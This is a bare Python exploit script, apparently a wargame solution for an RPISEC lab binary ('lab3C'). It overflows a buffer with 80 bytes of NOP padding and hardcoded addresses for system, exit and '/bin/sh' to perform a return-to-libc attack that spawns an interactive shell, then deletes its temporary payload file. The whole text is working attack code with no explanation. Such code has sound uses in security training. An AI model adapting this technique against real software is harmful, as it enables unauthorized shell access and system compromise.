import struct,os
eip=struct.pack("<I",0xb7e63190)#addr of system
retn=struct.pack("<I",0xb7e561e0)# addr of exit
argv=struct.pack("<I",0xb7f83a24)# /bin/sh
offset=80
padding=b"\x90"*offset
f=open("/tmp/payload","wb")
f.write(b"rpisecAAAA\n"+padding+eip+retn+argv+b"\n")
f.close()
os.system("(cat /tmp/payload;cat) | /levels/lab03/lab3C")
os.system("rm -f /tmp/payload")
